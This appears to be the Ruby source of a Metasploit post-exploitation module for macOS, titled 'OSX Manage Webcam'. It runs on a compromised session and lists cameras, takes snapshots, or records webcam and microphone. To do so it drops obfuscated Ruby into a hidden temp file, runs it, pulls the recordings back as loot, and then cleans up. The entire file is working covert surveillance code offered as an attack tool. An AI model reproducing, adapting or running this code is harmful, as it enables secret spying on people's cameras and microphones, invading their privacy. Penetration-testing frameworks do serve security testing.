##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'shellwords'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::OSX::RubyDL
  include Msf::Exploit::FileDropper

  POLL_TIMEOUT = 120

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OSX Manage Webcam',
      'Description'   => %q{
          This module will allow the user to detect installed webcams (with
          the LIST action), take a snapshot (with the SNAPSHOT action), or
          record a webcam and mic (with the RECORD action)
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev'],
      'Platform'      => [ 'osx'],
      'SessionTypes'  => [ 'shell' ],
      'Actions'       => [
        [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
        [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],
        [ 'RECORD', { 'Description' => 'Record with the webcam' } ]
      ],
      'DefaultAction' => 'LIST'
    ))

    register_options(
      [
        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use.', 0]),
        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use.', 0]),
        OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
        OptString.new('TMP_FILE',
          [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
        ),
        OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
        OptString.new('PRESET',
          [true, 'Quality preset to use.', 'AVCaptureSessionPresetHigh']
        ),
        OptEnum.new('SNAP_FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(jpg png gif tiff bmp)]
        ),
        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
      ], self.class)
  end

  def run
    fail_with("Invalid session ID selected.") if client.nil?
    fail_with("Invalid action") if action.nil?

    num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
    tmp_file = "#{datastore['TMP_FILE']}.mov".gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }

    ruby_code = osx_capture_media(
      :action => action.name.downcase,
      :snap_filetype => datastore['SNAP_FILETYPE'],
      :audio_enabled => datastore['AUDIO_ENABLED'],
      :video_enabled => true,
      :num_chunks => num_chunks,
      :chunk_len => datastore['SYNC_WAIT'],
      :video_device => datastore['CAMERA_INDEX'],
      :audio_device => datastore['MIC_INDEX'],
      :snap_jpg_compression => datastore['JPG_QUALITY'].to_f,
      :preset => datastore['PRESET'],
      :record_file => tmp_file,
      :snap_file => tmp_file+datastore['SNAP_FILETYPE']
    )


    # File.write('/Users/joe/Desktop/r3.rb', obfuscated_ruby_cmd(ruby_code))
    # return

    output = if session.type == 'meterpreter'
      # java meterpreter does not do so well with the huge cmd args for some reason.
      # instead we drop the script, exec, and remember to clean up
      tmp_sh = '/tmp/okay.sh'
      write_file(tmp_sh, obfuscated_ruby_cmd(ruby_code))
      register_files_for_cleanup(tmp_sh)
      cmd_exec("bash #{tmp_sh}")
    else
      cmd_exec(obfuscated_ruby_cmd(ruby_code))
    end

    # output = cmd_exec(obfuscated_ruby_cmd(ruby_code))

    if action.name =~ /list/i
      print_good "Detected devices:\n"+output
    elsif action.name =~ /record/i
      @pid = output.to_i

      if pid_failed?
        fail_with("Record service failed to run on client, bailing...")
      end

      print_status "Running record service with PID #{@pid}"
      (0...num_chunks).each do |i|
        # wait SYNC_WAIT seconds
        print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
        Rex.sleep(datastore['SYNC_WAIT'])
        # start polling the fs for the file
        begin
          ::Timeout.timeout(poll_timeout) do
            while true
              # when done recording, a ".done" extension is added to the file
              final_tmp_file = tmp_file+'.done'
              if File.exist?(final_tmp_file)
                # read file
                contents = read_file(final_tmp_file)
                # delete file
                rm_f(final_tmp_file)
                # roll filename
                base = File.basename(tmp_file, '.*') # returns it with no extension
                num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
                ext = File.extname(tmp_file) || '.o'
                tmp_file = File.join(File.dirname(tmp_file), base+num+ext)
                # store contents in file
                title = "OSX Webcam Recording "+i.to_s
                f = store_loot(title, "application/x-octet-stream", session, contents,
                  "osx_webcam_rec#{i}.mov", title)
                print_good "Record file captured and saved to #{f}"
                print_status "Rolling movie file. "
                break
              end
            end
          end
        rescue ::Timeout::Error
          fail_with("Client did not respond to new file request, exiting.")
        end
      end
    elsif action.name =~ /snap/i
      if output.include?('(RuntimeError)')
        print_error output
        return
      end

      snap_type = datastore['SNAP_FILETYPE']
      puts "Reading #{tmp_file+snap_type}..."
      img = read_file(tmp_file+snap_type)
      if img.present?
        f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
          session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
        print_good "Snapshot successfully taken and saved to #{f}"
      else
        fail_with("Snapshot failed: could not read #{tmp_file+snap_type} from client.")
      end
    end
  end

  def cleanup
    return unless @cleaning_up.nil?
    @cleaning_up = true

    if action.name =~ /record/i and not pid_failed?
      print_status("Killing record service...")
      cmd_exec("/bin/kill -9 #{@pid}")
    end

    super # let FileDropper do its thing
  end

  private

  def pid_failed?; @pid.nil? or @pid.zero?; end
  def poll_timeout; POLL_TIMEOUT; end
  def fail_with(msg); raise msg; end
end
